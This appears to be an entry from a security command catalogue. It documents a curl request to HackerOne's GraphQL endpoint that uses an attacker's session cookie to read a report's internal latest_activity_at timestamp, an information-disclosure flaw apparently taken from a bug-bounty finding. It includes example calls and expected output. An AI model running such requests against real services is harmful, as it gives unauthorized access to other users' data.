---
id: cmd-post-graphql-query
data: >-
  curl -X POST -H "Content-Type: application/json" -H "Cookie:
  <attacker-cookie>" -d '{"query":"query { node(id:
  \"gid://hackerone/Report/<report-id>\") { ... on Report {
  _id,latest_activity_at }}}","variables":{}}' https://hackerone.com/graphql
tags:
  - graphql
  - api
  - disclosure
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.554Z'
verified: false
validated: true
submitted: true
---
# post-graphql-query

## Command

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: <attacker-cookie>" -d '{"query":"query { node(id: \"gid://hackerone/Report/<report-id>\") { ... on Report { _id,latest_activity_at }}}","variables":{}}' https://hackerone.com/graphql
```

## Description

Sends a GraphQL query to HackerOne to fetch the latest_activity_at timestamp from a report node, leaking internal activity times to unauthorized users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<attacker-cookie>` | Attacker's session cookie for authentication | Yes |
| `<report-id>` | ID used in node ID (gid://hackerone/Report/<report-id>) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: <cookie>" -d '{"query":"query { node(id: \"gid://hackerone/Report/724944\") { ... on Report { _id,latest_activity_at }}}"}' https://hackerone.com/graphql
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: <cookie>" -d '{"query":"...","variables":{}}' https://hackerone.com/graphql | jq '.data.node.latest_activity_at'
```

## Expected Output

JSON response: {"data":{"node":{"_id":"gid://hackerone/Report/724944","latest_activity_at":"2023-10-01T12:00:00Z"}}}, revealing the internal timestamp.

## Related

- [[Related Procedure|procedures/Query-GraphQL-for-Latest-Activity-Timestamp]]
